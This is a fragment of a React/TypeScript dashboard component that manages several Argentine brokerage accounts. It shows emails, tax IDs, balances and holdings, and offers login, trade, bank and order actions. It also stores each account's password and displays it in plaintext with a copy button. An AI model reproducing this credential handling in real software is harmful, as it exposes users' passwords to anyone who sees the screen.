  const isRecent = lastActive && (Date.now() - new Date(lastActive).getTime()) < 3600000;

  const copyText = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(""), 1500);
  };

  const isLoading = (key: string) => opLoading === key;

  return (
    <div className={`rounded-xl border overflow-hidden transition-all ${hasToken ? "border-border bg-card hover:border-primary/15" : "border-red-500/20 bg-card"}`}>
      {/* Header */}
      <div className="flex items-center gap-3 px-3 py-2.5">
        <div className={`h-2 w-2 rounded-full shrink-0 ${isRecent ? "bg-green-400 animate-pulse" : hasToken ? "bg-muted-foreground/30" : "bg-red-500"}`} />
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-1.5 flex-wrap">
            <span className="text-[12px] font-bold text-foreground truncate">{name}</span>
            {hasToken && <span className="text-[7px] text-green-400 bg-green-500/10 px-1 py-0.5 rounded font-bold">TOKEN</span>}
            {!hasToken && <span className="text-[7px] text-red-400 bg-red-500/10 px-1 py-0.5 rounded font-bold">SEM TOKEN</span>}
          </div>
          <div className="flex items-center gap-1.5 mt-0.5 text-[9px] text-muted-foreground flex-wrap">
            <span className="truncate max-w-[200px]">{account.email}</span>
            <span>•</span>
            {account.password ? (
              <button onClick={() => copyText(account.password!, "pwd")} className="flex items-center gap-0.5 hover:opacity-80">
                <Lock size={7} className="text-yellow-400" />
                <span className="font-mono text-yellow-400 font-semibold">{account.password}</span>
                {copied === "pwd" ? <Check size={7} className="text-green-400" /> : <Copy size={7} />}
              </button>
            ) : (
              <span className="text-red-400 font-bold">SEM SENHA</span>
            )}
            <span>•</span>
            <span>Conta: {account.cuenta_id || "—"}</span>
            <span>•</span>
            <span>{timeAgo(lastActive)}</span>
          </div>
        </div>

        {/* Balances */}
        <div className="hidden sm:grid grid-cols-2 gap-3 shrink-0 text-right">
          <div>
            <p className="text-[8px] text-muted-foreground">ARS</p>
            <p className="text-[13px] font-bold text-emerald-400 tabular-nums">{fmtARS(totalArs)}</p>
          </div>
          <div>
            <p className="text-[8px] text-muted-foreground">USD</p>
            <p className={`text-[13px] font-bold tabular-nums ${totalUsd > 0 ? "text-sky-400" : "text-muted-foreground/20"}`}>{totalUsd > 0 ? fmtUSD(totalUsd) : "$0"}</p>
          </div>
        </div>

        {/* Actions */}
        <div className="flex items-center gap-0.5 shrink-0">
          <button onClick={onOperate} disabled={!hasToken && !account.password}
            className={`flex items-center gap-1 rounded-lg px-2.5 py-1.5 text-[10px] font-semibold transition-all ${
              hasToken ? "bg-primary text-primary-foreground hover:bg-primary/90" : account.password ? "bg-orange-500/10 text-orange-400" : "bg-secondary text-muted-foreground cursor-not-allowed"
            }`}>
            <Play size={10} /> Op
          </button>
          <button onClick={() => setExpanded(!expanded)} className="h-7 w-7 rounded-lg flex items-center justify-center text-muted-foreground hover:bg-secondary transition-colors">
            {expanded ? <ChevronUp size={12} /> : <ChevronDown size={12} />}
          </button>
          <button onClick={onDelete} className="h-7 w-7 rounded-lg flex items-center justify-center text-destructive/30 hover:text-destructive hover:bg-destructive/10 transition-colors">
            <Trash2 size={12} />
          </button>
        </div>
      </div>

      {/* Quick action buttons */}
      <div className="px-3 pb-1.5 flex items-center gap-1 flex-wrap">
        <button onClick={onLogin} disabled={isLoading(`login-${account.id}`)}
          className="text-[8px] px-2 py-0.5 rounded border border-blue-500/20 text-blue-400 font-semibold hover:bg-blue-500/10 disabled:opacity-50 flex items-center gap-0.5">
          {isLoading(`login-${account.id}`) ? <Loader2 size={8} className="animate-spin" /> : <Zap size={8} />} Login
        </button>
        <button onClick={onBalances} disabled={isLoading(`bal-${account.id}`)}
          className="text-[8px] px-2 py-0.5 rounded border border-emerald-500/20 text-emerald-400 font-semibold hover:bg-emerald-500/10 disabled:opacity-50 flex items-center gap-0.5">
          {isLoading(`bal-${account.id}`) ? <Loader2 size={8} className="animate-spin" /> : <DollarSign size={8} />} Saldo
        </button>
        <button onClick={onBanks} disabled={isLoading(`bank-${account.id}`)}
          className="text-[8px] px-2 py-0.5 rounded border border-orange-500/20 text-orange-400 font-semibold hover:bg-orange-500/10 disabled:opacity-50 flex items-center gap-0.5">
          {isLoading(`bank-${account.id}`) ? <Loader2 size={8} className="animate-spin" /> : <Building size={8} />} Bancos
        </button>
        <button onClick={onOrders} disabled={isLoading(`orders-${account.id}`)}
          className="text-[8px] px-2 py-0.5 rounded border border-purple-500/20 text-purple-400 font-semibold hover:bg-purple-500/10 disabled:opacity-50 flex items-center gap-0.5">
          {isLoading(`orders-${account.id}`) ? <Loader2 size={8} className="animate-spin" /> : <History size={8} />} Ordens
        </button>
      </div>

      {/* Expanded details */}
      {expanded && (
        <div className="border-t border-border/30 px-3 py-3 space-y-2">
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
            <BalanceBox label="💰 ARS Total" value={fmtARS(totalArs)} color="text-emerald-400" />
            <BalanceBox label="🇺🇸 USD Total" value={fmtUSD(totalUsd)} color="text-sky-400" />
            <BalanceBox label="Comitente" value={account.comitente || "—"} color="text-foreground" />
            <BalanceBox label="Conta ID" value={String(account.cuenta_id || "—")} color="text-foreground" />
          </div>
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-x-4 gap-y-1">
            {account.email && (
              <button onClick={() => copyText(account.email, "email")} className="flex items-center gap-1 text-[9px] text-muted-foreground hover:text-foreground">
                <span className="font-semibold">Email:</span> <span className="truncate">{account.email}</span>
                {copied === "email" ? <Check size={8} className="text-green-400" /> : <Copy size={8} />}
              </button>
            )}
            {account.username && (
              <button onClick={() => copyText(account.username!, "user")} className="flex items-center gap-1 text-[9px] text-muted-foreground hover:text-foreground">
                <span className="font-semibold">User:</span> {account.username}
                {copied === "user" ? <Check size={8} className="text-green-400" /> : <Copy size={8} />}
              </button>
            )}
            {account.cuit && (
              <button onClick={() => copyText(account.cuit!, "cuit")} className="flex items-center gap-1 text-[9px] text-muted-foreground hover:text-foreground">
                <span className="font-semibold">CUIT:</span> {account.cuit}
                {copied === "cuit" ? <Check size={8} className="text-green-400" /> : <Copy size={8} />}
              </button>
            )}
          </div>
          {/* Instruments summary */}
          {account.balance_data?.groupedInstruments?.map((group: any) => (
            <div key={group.instrumentTypeId} className="text-[9px] text-muted-foreground">
              <span className="font-semibold text-foreground">{group.name}:</span>{" "}
              {group.instruments?.map((i: any) => `${i.ticker} (${i.instrumentAmount})`).join(", ")}
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

export default PpiDashboard;
